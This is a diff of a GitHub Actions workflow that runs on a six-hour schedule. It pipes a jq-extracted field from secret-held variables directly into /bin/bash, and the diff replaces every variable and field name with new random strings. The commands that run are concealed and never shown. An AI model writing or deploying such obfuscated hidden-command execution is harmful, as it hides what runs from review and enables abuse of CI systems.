@@ -1,27 +1,27 @@
 name: fangziwenni
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 3/6 * * *'
-
+    - cron: '51 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fangziwenni
         env:
-          tolyy19: ${{ secrets.tolyy19 }}
+          fri431: ${{ secrets.fri431 }}
         run: |
-          echo $tolyy19 | jq -r .h83711 | /bin/bash
-          echo $p72758 | jq -r .lbc16015 | /bin/bash
-          echo $vga8 | jq -r .frz287 | /bin/bash
-          echo $yqgs9 | jq -r .ih58545 | /bin/bash
-          echo $nhk0 | jq -r .odye1584 | /bin/bash
-          echo $nf27968 | jq -r .k08411 | /bin/bash
-          echo $d82890 | jq -r .we55 | /bin/bash
-          echo $thhn3 | jq -r .i308 | /bin/bash
-          echo $yhhb0905 | jq -r .r67470 | /bin/bash
-          echo $mvwii0501 | jq -r .xvph17373 | /bin/bash
-          echo $ii637 | jq -r .w7 | /bin/bash
+          echo $fri431 | jq -r .imtuq6 | /bin/bash
+          echo $iyjgm1294 | jq -r .aga4 | /bin/bash
+          echo $gi0530 | jq -r .qigux5897 | /bin/bash
+          echo $v175 | jq -r .er8 | /bin/bash
+          echo $rhuva4 | jq -r .cmt31 | /bin/bash
+          echo $jxi9629 | jq -r .md13 | /bin/bash
+          echo $mcx1 | jq -r .nbdff89 | /bin/bash
+          echo $bulye91403 | jq -r .n4 | /bin/bash
+          echo $kjmj0 | jq -r .x63519 | /bin/bash
+          echo $xll253 | jq -r .hd5 | /bin/bash
 
